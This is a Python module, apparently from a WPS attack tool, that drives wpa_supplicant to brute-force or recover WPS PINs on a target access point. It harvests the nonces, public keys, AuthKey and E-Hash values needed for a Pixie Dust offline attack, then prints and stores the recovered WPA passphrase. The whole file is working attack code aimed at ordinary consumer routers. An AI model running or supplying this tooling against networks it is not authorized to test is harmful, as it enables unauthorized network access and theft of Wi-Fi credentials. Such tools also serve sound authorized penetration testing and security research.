import socket
import tempfile
import os
import subprocess
import time
import shutil
import sys
import codecs

import src.wps.pixiewps
import src.wps.generator
import src.utils
import src.wifi.collector

class ConnectionStatus:
    """Stores WPS connection details and status."""

    def __init__(self):
        self.STATUS = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
        self.LAST_M_MESSAGE = 0
        self.ESSID = ''
        self.BSSID = ''
        self.WPA_PSK = ''

    def isFirstHalfValid(self) -> bool:
        """Checks if the first half of the PIN is valid."""
        return self.LAST_M_MESSAGE > 5

    def clear(self):
        """Resets the connection status variables."""
        self.__init__()

class Initialize:
    """WPS connection"""

    def __init__(self, interface: str, write_result: bool = False, save_result: bool = False, print_debug: bool = False):
        self.INTERFACE    = interface
        self.WRITE_RESULT = write_result
        self.SAVE_RESULT  = save_result
        self.PRINT_DEBUG  = print_debug

        self.CONNECTION_STATUS = ConnectionStatus()
        self.PIXIE_CREDS  = src.wps.pixiewps.Data()

        self.TEMPDIR = tempfile.mkdtemp()

        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write(f'ctrl_interface={self.TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n')
            self.TEMPCONF = temp.name

        self.WPAS_CTRL_PATH = f'{self.TEMPDIR}/{self.INTERFACE}'
        self._initWpaSupplicant()

        self.RES_SOCKET_FILE = f'{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}'
        self.RETSOCK = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.RETSOCK.bind(self.RES_SOCKET_FILE)

    @staticmethod
    def _getHex(line: str) -> str:
        """Filters WPA Supplicant output, and removes whitespaces"""

        a = line.split(':', 3)
        return a[2].replace(' ', '').upper()

    @staticmethod
    def _explainWpasNotOkStatus(command: str, respond: str):
        """Outputs details about WPA supplicant errors"""

        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    @staticmethod
    def _credentialPrint(wps_pin: str = None, wpa_psk: str = None, essid: str = None):
        """Prints network credentials after success"""

        print(f'[+] WPS PIN: \'{wps_pin}\'')
        print(f'[+] WPA PSK: \'{wpa_psk}\'')
        print(f'[+] AP SSID: \'{essid}\'')

    def singleConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False, showpixiecmd: bool = False,
                         pixieforce: bool = False, pbc_mode: bool = False, store_pin_on_fail: bool = False) -> bool:
        """        
        Establish a WPS connection, using a pin, a calculated pin (if in pixiemode), a PIN
        generated from a list of likely PINs, or PBC mode. handles pixiedust
        attacks if enabled and manages storing PINs on connection failure
        """

        pixiewps_dir = src.utils.PIXIEWPS_DIR
        generator    = src.wps.generator.WPSpin()
        collector    = src.wifi.collector.WiFiCollector()

        if not pin:
            if pixiemode:
                try:
                    filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''

                    with open(filename, 'r', encoding='utf-8') as file:
                        t_pin = file.readline().strip()
                        if input(f'[?] Use previously calculated PIN {t_pin}? [n/Y] ').lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                # If not pixiemode, ask user to select a pin from the list
                pin = generator.promptPin(bssid) or '12345670'

        if pbc_mode:
            self._wpsConnection(bssid, pbc_mode=pbc_mode)
            bssid = self.CONNECTION_STATUS.BSSID
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self._wpsConnection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print('\nAborting…')
                collector.writePin(bssid, pin)
                return False
        else:
            self._wpsConnection(bssid, pin, pixiemode)

        if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
            self._credentialPrint(pin, self.CONNECTION_STATUS.WPA_PSK, self.CONNECTION_STATUS.ESSID)
            if self.WRITE_RESULT:
                collector.writeResult(bssid, self.CONNECTION_STATUS.ESSID, pin, self.CONNECTION_STATUS.WPA_PSK)
            if self.SAVE_RESULT:
                collector.addNetwork(bssid, self.CONNECTION_STATUS.ESSID, self.CONNECTION_STATUS.WPA_PSK)
            if not pbc_mode:
                # Try to remove temporary PIN file
                try:
                    filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True
        if pixiemode:
            if self.PIXIE_CREDS.getAll():
                pin = self.PIXIE_CREDS.runPixieWps(showpixiecmd, pixieforce)
                if pin:
                    return self.singleConnection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                print('[!] Not enough data to run Pixie Dust attack')
                return False
        else:
            if store_pin_on_fail:
                # Saving Pixiewps calculated PIN if can't connect
                collector.writePin(bssid, pin)
            return False

    def _initWpaSupplicant(self):
        """Initializes wpa_supplicant with the specified configuration"""

        print('[*] Running wpa_supplicant…')

        wpa_supplicant_cmd = ['wpa_supplicant']
        wpa_supplicant_cmd.extend([
            '-K', '-d',
            '-Dnl80211,wext,hostapd,wired',
            f'-i{self.INTERFACE}',
            f'-c{self.TEMPCONF}'
        ])

        self.WPAS = subprocess.Popen(wpa_supplicant_cmd,
            encoding='utf-8', stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )

        # Waiting for wpa_supplicant control interface initialization
        while True:
            ret = self.WPAS.poll()

            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant returned an error: ' + self.WPAS.communicate()[0])
            if os.path.exists(self.WPAS_CTRL_PATH):
                break

            time.sleep(.1)

    def _sendAndReceive(self, command: str) -> str:
        """Sends command to wpa_supplicant and returns the reply"""

        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)

        (b, _address) = self.RETSOCK.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    def _sendOnly(self, command: str):
        """Sends command to wpa_supplicant without reply"""

        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)

    def _handleWpas(self, pixiemode: bool = False, pbc_mode: bool = False, verbose: bool = None) -> bool:
        """Handles WPA supplicant output and updates connection status."""

        # pylint: disable=invalid-name
        line = self.WPAS.stdout.readline()

        if not verbose:
            verbose = self.PRINT_DEBUG
        if not line:
            self.WPAS.wait()
            return False

        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'M2D' in line:
                print('[-] Received WPS Message M2D')
                src.utils.die('[-] Error: AP is not ready yet, try later')
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1])
                self.CONNECTION_STATUS.LAST_M_MESSAGE = n
                print(f'[*] Sending WPS Message M{n}…')
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.CONNECTION_STATUS.LAST_M_MESSAGE = n
                print(f'[*] Received WPS Message M{n}')
                if n == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.CONNECTION_STATUS.STATUS = 'WSC_NACK'
                print('[-] Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.PIXIE_CREDS.E_NONCE = self._getHex(line)
                assert len(self.PIXIE_CREDS.E_NONCE) == 16 * 2
                if pixiemode:
                    print(f'[P] E-Nonce: {self.PIXIE_CREDS.E_NONCE}')
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.PIXIE_CREDS.PKR = self._getHex(line)
                assert len(self.PIXIE_CREDS.PKR) == 192 * 2
                if pixiemode:
                    print(f'[P] PKR: {self.PIXIE_CREDS.PKR}')
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.PIXIE_CREDS.PKE = self._getHex(line)
                assert len(self.PIXIE_CREDS.PKE) == 192 * 2
                if pixiemode:
                    print(f'[P] PKE: {self.PIXIE_CREDS.PKE}')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.PIXIE_CREDS.AUTHKEY = self._getHex(line)
                assert len(self.PIXIE_CREDS.AUTHKEY) == 32 * 2
                if pixiemode:
                    print(f'[P] AuthKey: {self.PIXIE_CREDS.AUTHKEY}')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.PIXIE_CREDS.E_HASH1 = self._getHex(line)
                assert len(self.PIXIE_CREDS.E_HASH1) == 32 * 2
                if pixiemode:
                    print(f'[P] E-Hash1: {self.PIXIE_CREDS.E_HASH1}')
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.PIXIE_CREDS.E_HASH2 = self._getHex(line)
                assert len(self.PIXIE_CREDS.E_HASH2) == 32 * 2
                if pixiemode:
                    print(f'[P] E-Hash2: {self.PIXIE_CREDS.E_HASH2}')
            elif 'Network Key' in line and 'hexdump' in line:
                self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
                self.CONNECTION_STATUS.WPA_PSK = bytes.fromhex(self._getHex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.CONNECTION_STATUS.STATUS = 'scanning'
                print('[*] Scanning…')
        elif ('WPS-FAIL' in line) and (self.CONNECTION_STATUS.STATUS != ''):
            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            print('[-] wpa_supplicant returned WPS-FAIL')
#        elif 'NL80211_CMD_DEL_STATION' in line:
#            print("[-] Something else is trying to use the interface!")
        elif 'Trying to authenticate with' in line:
            self.CONNECTION_STATUS.STATUS = 'authenticating'
            if 'SSID' in line:
                self.CONNECTION_STATUS.ESSID = codecs.decode('\''.join(line.split('\'')[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Authenticating…')
        elif 'Authentication response' in line:
            print('[+] Authenticated')
        elif 'Trying to associate with' in line:
            self.CONNECTION_STATUS.STATUS = 'associating'
            if 'SSID' in line:
                self.CONNECTION_STATUS.ESSID = codecs.decode('\''.join(line.split('\'')[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Associating with AP…')
        elif ('Associated with' in line) and (self.INTERFACE in line):
            bssid = line.split()[-1].upper()
            if self.CONNECTION_STATUS.ESSID:
                print(f'[+] Associated with {bssid} (ESSID: {self.CONNECTION_STATUS.ESSID})')
            else:
                print(f'[+] Associated with {bssid}')
        elif 'EAPOL: txStart' in line:
            self.CONNECTION_STATUS.STATUS = 'eapol_start'
            print('[*] Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            print('[*] Received Identity Request')
        elif 'using real identity' in line:
            print('[*] Sending Identity Response…')
        elif 'WPS-TIMEOUT' in line:
            print('[-] Warning: Received WPS-TIMEOUT')
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.CONNECTION_STATUS.BSSID = bssid
            print(f'[*] Selected AP: {bssid}')

        return True

    def _wpsConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False,
                       pbc_mode: bool = False, verbose: bool = None) -> bool:
        """Handles WPS connection process"""

        self.PIXIE_CREDS.clear()
        self.CONNECTION_STATUS.clear()
        self.WPAS.stdout.read(300) # Clean the pipe

        if not verbose:
            verbose = self.PRINT_DEBUG

        if pbc_mode:
            if bssid:
                print(f'[*] Starting WPS push button connection to {bssid}…')
                cmd = f'WPS_PBC {bssid}'
            else:
                print('[*] Starting WPS push button connection…')
                cmd = 'WPS_PBC'
        else:
            print(f'[*] Trying PIN \'{pin}\'…')
            cmd = f'WPS_REG {bssid} {pin}'

        r = self._sendAndReceive(cmd)

        if 'OK' not in r:
            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            print(self._explainWpasNotOkStatus(cmd, r))
            return False

        while True:
            res = self._handleWpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)

            if not res:
                break
            if self.CONNECTION_STATUS.STATUS == 'WSC_NACK':
                break
            if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
                break
            if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                break

        self._sendOnly('WPS_CANCEL')
        return False

    def _cleanup(self):
        """Terminates connections and removes temporary files"""

        try:
            self.RETSOCK.close()
            self.WPAS.terminate()
        except ImportError:
            # Ignore errors during interpreter shutdown
            # Exception: sys.meta_path is None, Python is likely shutting down
            pass

        os.remove(self.RES_SOCKET_FILE)
        shutil.rmtree(self.TEMPDIR, ignore_errors=True)
        os.remove(self.TEMPCONF)

    def __del__(self):
        self._cleanup()
